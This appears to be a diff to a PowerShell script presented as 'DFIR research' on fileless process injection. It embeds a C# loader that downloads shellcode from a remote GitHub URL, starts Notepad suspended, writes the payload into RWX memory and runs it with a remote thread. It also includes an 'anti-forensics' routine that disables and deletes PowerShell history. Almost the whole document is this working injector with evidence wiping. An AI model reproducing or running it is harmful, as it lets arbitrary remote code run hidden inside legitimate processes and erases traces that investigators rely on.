@@ -1,9 +1,15 @@
+<#
+    PROJECT: Fileless Process Hollowing (Donut Shellcode Edition)
+    PURPOSE: DFIR Research - Injecting 64-bit AutoClicker into 64-bit Notepad
+    AUTHOR: [Your Name]
+#>
+
 # --- CONFIGURATION ---
-# [IMPORTANT] Paste your Raw GitHub URL here for payload.bin
+# [IMPORTANT] Replace with your RAW GitHub URL
 $PayloadUrl = "https://raw.githubusercontent.com/stumbs/NotePadInjection/main/payload.bin"
 
 
-# --- PART 1: THE C# LOADER (The Engine) ---
+# --- PART 1: THE C# LOADER ---
 $Code = @"
 using System;
 using System.Runtime.InteropServices;
@@ -11,58 +17,37 @@ using System.Net;
 
 public class FilelessLoader {
     
-    // --- P/Invoke Definitions ---
+    // --- Windows API Imports ---
+    
     [DllImport("kernel32.dll", SetLastError = true)]
     public static extern bool CreateProcess(
-        string lpApplicationName, 
-        string lpCommandLine, 
-        IntPtr lpProcessAttributes, 
-        IntPtr lpThreadAttributes, 
-        bool bInheritHandles, 
-        uint dwCreationFlags, 
-        IntPtr lpEnvironment, 
-        string lpCurrentDirectory, 
-        ref STARTUPINFO lpStartupInfo, 
-        out PROCESS_INFORMATION lpProcessInformation
-    );
+        string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, 
+        IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, 
+        IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, 
+        out PROCESS_INFORMATION lpProcessInformation);
 
     [DllImport("kernel32.dll", SetLastError = true)]
     public static extern IntPtr VirtualAllocEx(
-        IntPtr hProcess, 
-        IntPtr lpAddress, 
-        uint dwSize, 
-        uint flAllocationType, 
-        uint flProtect
-    );
+        IntPtr hProcess, IntPtr lpAddress, uint dwSize, 
+        uint flAllocationType, uint flProtect);
 
     [DllImport("kernel32.dll", SetLastError = true)]
     public static extern bool WriteProcessMemory(
-        IntPtr hProcess, 
-        IntPtr lpBaseAddress, 
-        byte[] lpBuffer, 
-        uint nSize, 
-        out IntPtr lpNumberOfBytesWritten
-    );
+        IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, 
+        uint nSize, out IntPtr lpNumberOfBytesWritten);
 
     [DllImport("kernel32.dll", SetLastError = true)]
     public static extern IntPtr CreateRemoteThread(
-        IntPtr hProcess, 
-        IntPtr lpThreadAttributes, 
-        uint dwStackSize, 
-        IntPtr lpStartAddress, 
-        IntPtr lpParameter, 
-        uint dwCreationFlags, 
-        IntPtr lpThreadId
-    );
-    
-    // [FIX] Added ResumeThread to wake up the process
+        IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, 
+        IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
     [DllImport("kernel32.dll", SetLastError = true)]
     public static extern uint ResumeThread(IntPtr hThread);
 
-    // --- Corrected Data Structures ---
+    // --- Structures ---
+    
     [StructLayout(LayoutKind.Sequential)]
-    public struct STARTUPINFO
-    {
+    public struct STARTUPINFO {
         public uint cb;
         public IntPtr lpReserved;
         public IntPtr lpDesktop;
@@ -91,100 +76,71 @@ public class FilelessLoader {
         public int dwThreadId; 
     }
 
-    // --- The Main Logic ---
+    // --- Execution Logic ---
     public static void Execute(string url) {
         try {
-            Console.WriteLine("[*] Fetching payload from GitHub...");
+            Console.WriteLine("[*] Fetching 64-bit Payload from GitHub...");
             ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
             WebClient wc = new WebClient();
             byte[] shellcode = wc.DownloadData(url);
             
-            if (shellcode.Length == 0) {
-                Console.WriteLine("[-] Download failed. Check URL.");
-                return;
-            }
+            if (shellcode.Length == 0) { Console.WriteLine("[-] Failed to download."); return; }
 
-            Console.WriteLine("[*] Starting Notepad (Suspended)...");
+            Console.WriteLine("[*] Spawning 64-bit Notepad (Suspended)...");
             
             STARTUPINFO si = new STARTUPINFO();
             si.cb = (uint)Marshal.SizeOf(si);
             PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
             
-            // 0x4 = CREATE_SUSPENDED
-            bool success = CreateProcess(@"C:\Windows\System32\notepad.exe", null, IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
+            // TARGET: System32 (64-bit) to match your 64-bit AutoClicker
+            bool success = CreateProcess(@"C:\Windows\System32\notepad.exe", null, 
+                IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
             
-            if (!success) { 
-                Console.WriteLine("[-] Failed to create process. Error Code: " + Marshal.GetLastWin32Error()); 
-                return; 
-            }
+            if (!success) { Console.WriteLine("[-] CreateProcess failed."); return; }
 
-            Console.WriteLine("[*] Process ID: " + pi.dwProcessId);
-            Console.WriteLine("[*] Allocating RWX Memory...");
+            Console.WriteLine("[*] Allocating Memory (RWX)...");
             IntPtr remoteMem = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
-
-            if (remoteMem == IntPtr.Zero) {
-                 Console.WriteLine("[-] Allocation failed.");
-                 return;
-            }
 
             Console.WriteLine("[*] Writing Payload...");
             IntPtr bytesWritten;
             WriteProcessMemory(pi.hProcess, remoteMem, shellcode, (uint)shellcode.Length, out bytesWritten);
 
-            Console.WriteLine("[*] Detonating via Remote Thread...");
+            Console.WriteLine("[*] Executing Payload...");
+            // Run the payload in a new thread
             CreateRemoteThread(pi.hProcess, IntPtr.Zero, 0, remoteMem, IntPtr.Zero, 0, IntPtr.Zero);
             
-            // [FIX] Resume the main thread so Notepad actually appears!
-            Console.WriteLine("[*] Waking up Notepad (ResumeThread)...");
+            // Resume the main thread so the process is 'alive' enough for the GUI
             ResumeThread(pi.hThread);
             
-            Console.WriteLine("[+] Injection Complete. Notepad should be visible.");
+            Console.WriteLine("[+] Injection Success. Check for the AutoClicker window!");
         }
         catch (Exception e) {
-            Console.WriteLine("[-] Critical Error: " + e.ToString());
+            Console.WriteLine("[-] Error: " + e.Message);
         }
     }
 }
 "@
 
-
-# --- PART 2: ANTI-FORENSICS (The Cleaner) ---
+# --- PART 2: ANTI-FORENSICS ---
 function Invoke-StealthCleanup {
-    Write-Host "`n[*] Initiating Anti-Forensic Cleanup..." -ForegroundColor Yellow
+    Write-Host "`n[*] Cleaning Evidence..." -ForegroundColor Yellow
     Set-PSReadlineOption -HistorySaveStyle SaveNothing
     $HistoryPath = (Get-PSReadlineOption).HistorySavePath
-    
     if (Test-Path $HistoryPath) {
-        try {
-            Remove-Item -Path $HistoryPath -Force -ErrorAction SilentlyContinue
-            Write-Host "[+] Artifact Deleted: PowerShell History file wiped." -ForegroundColor Green
-        }
-        catch {
-            Write-Host "[-] Cleanup Failed." -ForegroundColor Red
-        }
+        Remove-Item -Path $HistoryPath -Force -ErrorAction SilentlyContinue
+        Write-Host "[+] History File Wiped." -ForegroundColor Green
     }
 }
 
+# --- PART 3: LAUNCH ---
+Write-Host "[*] Compiling Engine..." -ForegroundColor Cyan
+Add-Type -TypeDefinition $Code -Language CSharp
 
-# --- PART 3: EXECUTION CHAIN ---
-
-Write-Host "[*] Compiling Loader in Memory..." -ForegroundColor Cyan
-try {
-    Add-Type -TypeDefinition $Code -Language CSharp
-}
-catch {
-    Write-Error "Compilation Failed. Details:"
-    $error[0] | Out-String
-    Read-Host "Press ENTER to exit..."
-    exit
-}
-
-# Execute
+# Run
 [FilelessLoader]::Execute($PayloadUrl)
 
-# Cleanup
+# Clean
 Invoke-StealthCleanup
 
-# [FIX] Pause so you can read the screen before it closes
-Write-Host "`n[!] Script Finished." -ForegroundColor Cyan
-Read-Host "Press ENTER to close this window..."
+Write-Host "`n[!] Operation Complete." -ForegroundColor Cyan
+Read-Host "Press ENTER to exit..."
